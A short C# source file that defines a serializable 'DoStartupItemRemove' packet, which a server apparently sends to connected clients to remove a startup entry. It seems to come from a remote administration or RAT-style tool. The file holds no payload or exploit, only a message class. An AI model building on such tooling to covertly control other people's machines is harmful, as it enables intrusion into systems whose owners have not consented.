using System;
using xServer.KuuhakuCekirdek.Ağ;

namespace xServer.KuuhakuCekirdek.Paketler.ServerPaketleri
{
    [Serializable]
    public class DoStartupItemRemove : IPacket
    {
        public string Name { get; set; }

        public string Path { get; set; }

        public int Type { get; set; }

        public DoStartupItemRemove()
        {
        }

        public DoStartupItemRemove(string name, string path, int type)
        {
            this.Name = name;
            this.Path = path;
            this.Type = type;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}